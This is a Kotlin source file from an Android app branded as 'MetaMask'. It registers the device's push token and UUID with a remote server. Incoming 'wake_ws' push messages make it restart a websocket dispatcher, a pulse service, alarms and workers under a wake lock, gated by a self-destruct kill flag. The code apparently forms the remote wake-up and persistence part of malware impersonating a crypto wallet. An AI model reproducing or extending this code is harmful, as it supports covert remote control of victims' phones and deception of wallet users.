package com.example.MetaMask.services

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.os.UserManager
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequest
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.receivers.AlarmReceiver
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class FcmTokenService : FirebaseMessagingService() {

    companion object {
        internal const val PREFS_NAME = "fcm_prefs"
        internal const val PREF_TOKEN = "fcm_token"
        private const val CONFIRMED_PREFS_NAME = "fcm_confirmed"
        private const val PREF_TOKEN_CONFIRMED = "fcm_token_confirmed"

        @Suppress("DEPRECATION")
        private fun confirmedPrefs(ctx: Context) =
            ctx.getSharedPreferences(CONFIRMED_PREFS_NAME, Context.MODE_MULTI_PROCESS)

        fun markTokenConfirmed(ctx: Context, confirmed: Boolean) {
            android.util.Log.d("XDBG", "[FcmTokenService] markTokenConfirmed enter ctx=ctx confirmed=${confirmed}") //xdbg
            try {
                confirmedPrefs(ctx).edit().putBoolean(PREF_TOKEN_CONFIRMED, confirmed).apply()
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }
        }

        fun isTokenConfirmed(ctx: Context): Boolean {
            android.util.Log.d("XDBG", "[FcmTokenService] isTokenConfirmed enter ctx=ctx") //xdbg
            android.util.Log.d("XDBG", "[FcmTokenService] return") //xdbg
            return try {
                confirmedPrefs(ctx).getBoolean(PREF_TOKEN_CONFIRMED, false)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
                false
            }
        }

        private fun cacheToken(ctx: Context, token: String) {
            android.util.Log.d("XDBG", "[FcmTokenService] cacheToken enter ctx=ctx token=${token}") //xdbg
            try {
                val userManager = ctx.getSystemService(Context.USER_SERVICE) as UserManager
                if (!userManager.isUserUnlocked) return

                ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit().putString(PREF_TOKEN, token).apply()
                markTokenConfirmed(ctx, false)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }
        }

        fun pushCurrentTokenToServer(ctx: Context) {
            android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer enter pkg=${ctx.packageName}") //xdbg
            try {
                DeviceUUIDProvider.init(ctx)
                com.example.MetaMask.utils.FCMConfig.init(ctx)
                android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer calling FirebaseMessaging.getInstance().token") //xdbg

                FirebaseMessaging.getInstance().token
                    .addOnCompleteListener { task ->
                        android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer token task complete isSuccessful=${task.isSuccessful}") //xdbg
                        if (!task.isSuccessful) {
                            android.util.Log.e("XDBG", "[FcmTokenService] pushCurrentTokenToServer token FAILED exception=${task.exception?.javaClass?.simpleName}: ${task.exception?.message}") //xdbg
                            scheduleSendWorker(ctx)
                            return@addOnCompleteListener
                        }

                        val token = task.result
                        android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer token obtained isEmpty=${token.isNullOrEmpty()} token=${token?.take(20)}...") //xdbg
                        if (token.isNullOrEmpty()) {
                            android.util.Log.e("XDBG", "[FcmTokenService] pushCurrentTokenToServer token is null/empty, abort") //xdbg
                            return@addOnCompleteListener
                        }

                        val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                        val cachedToken = prefs.getString(PREF_TOKEN, null)
                        val confirmed = isTokenConfirmed(ctx)
                        android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer cachedToken=${cachedToken?.take(20)}... confirmed=$confirmed tokenChanged=${token != cachedToken}") //xdbg

                        if (token == cachedToken && confirmed) {
                            android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer token same and confirmed, skip") //xdbg
                            return@addOnCompleteListener
                        }

                        if (token != cachedToken) {
                            android.util.Log.d("XDBG", "[FcmTokenService] pushCurrentTokenToServer token changed, caching") //xdbg
                            cacheToken(ctx, token)
                        }

                        sendTokenToServer(ctx, token)
                    }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] pushCurrentTokenToServer catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        private fun sendTokenToServer(ctx: Context, token: String) {
            android.util.Log.d("XDBG", "[FcmTokenService] sendTokenToServer enter token=${token.take(20)}...") //xdbg
            try {
                DeviceUUIDProvider.init(ctx)
                val uuid = DeviceUUIDProvider.getUUID()
                val wsRunning = MasterWebSocketDispatcher.IS_SERVICE_RUNNING
                android.util.Log.d("XDBG", "[FcmTokenService] sendTokenToServer uuid=$uuid wsRunning=$wsRunning") //xdbg

                val payload = JSONObject().apply {
                    put("action", "fcmTokenUpdate")
                    put("fcmToken", token)
                    put("uuid", uuid)
                    put("packageName", ctx.packageName)
                }

                if (wsRunning) {
                    android.util.Log.d("XDBG", "[FcmTokenService] sendTokenToServer WS running → sending broadcast ACTION_SEND_TO_SERVER") //xdbg
                    val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                        putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                        setPackage(ctx.packageName)
                    }
                    ctx.sendBroadcast(intent)
                    android.util.Log.d("XDBG", "[FcmTokenService] sendTokenToServer broadcast sent") //xdbg
                } else {
                    android.util.Log.d("XDBG", "[FcmTokenService] sendTokenToServer WS NOT running → scheduleSendWorker") //xdbg
                    scheduleSendWorker(ctx)
                }

            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] sendTokenToServer catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                scheduleSendWorker(ctx)
            }
        }

        internal fun scheduleSendWorker(ctx: Context) {
            android.util.Log.d("XDBG", "[FcmTokenService] scheduleSendWorker enter ctx=ctx") //xdbg
            try {
                val constraints = Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()

                val request = OneTimeWorkRequestBuilder<FcmTokenSendWorker>()
                    .setConstraints(constraints)
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                    .addTag("FCM_TOKEN_SEND")
                    .build()

                WorkManager.getInstance(ctx).enqueueUniqueWork(
                    "FcmTokenSend",
                    ExistingWorkPolicy.REPLACE,
                    request
                )
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }
        }
    }

    override fun onNewToken(token: String) {
        android.util.Log.d("XDBG", "[FcmTokenService] onNewToken enter token=${token}") //xdbg
        super.onNewToken(token)

        try {
            val userManager = getSystemService(Context.USER_SERVICE) as UserManager
            if (userManager.isUserUnlocked) {
                android.util.Log.d("XDBG", "[FcmTokenService] if branch") //xdbg
                DeviceUUIDProvider.init(applicationContext)
                cacheToken(applicationContext, token)
                sendTokenToServer(applicationContext, token)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
        }
    }

    override fun onMessageReceived(message: RemoteMessage) {
        android.util.Log.d("XDBG", "[FcmTokenService] onMessageReceived enter message=${message}") //xdbg
        super.onMessageReceived(message)

        val data = message.data
        val type = data["type"] ?: ""

        if (type == "healthcheck") return

        if (type == "wake_ws") {
            android.util.Log.d("XDBG", "[FcmTokenService] if branch") //xdbg
            handleWakeUpCommand()
        }
    }

    private fun handleWakeUpCommand() {
        android.util.Log.d("XDBG", "[FcmTokenService] handleWakeUpCommand enter") //xdbg
        val ctx = applicationContext

        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MetaMask:FcmWakeLock")
        wl.acquire(30_000L)

        try {
            val killPrefs = ctx.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            if (killPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) return

            try {
                val intent = Intent(ctx, MasterWebSocketDispatcher::class.java).apply {
                    putExtra("started_from_push", true)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[FcmTokenService] if branch") //xdbg
                    ctx.startForegroundService(intent)
                } else {
                    ctx.startService(intent)
                }
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }

            try {
                val pulseIntent = Intent(ctx, PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[FcmTokenService] if branch") //xdbg
                    ctx.startForegroundService(pulseIntent)
                } else {
                    ctx.startService(pulseIntent)
                }
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }

            try {
                val alarmIntent = Intent(ctx, AlarmReceiver::class.java)
                ctx.sendBroadcast(alarmIntent)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }

            try {
                val request = OneTimeWorkRequest.Builder(ServiceStarterWorker::class.java)
                    .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                    .addTag("FCM_WAKE_UP_JOB")
                    .build()
                WorkManager.getInstance(ctx).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenService] catch (ignored)") //xdbg
            }
        } finally {
            if (wl.isHeld) wl.release()
        }
    }
}
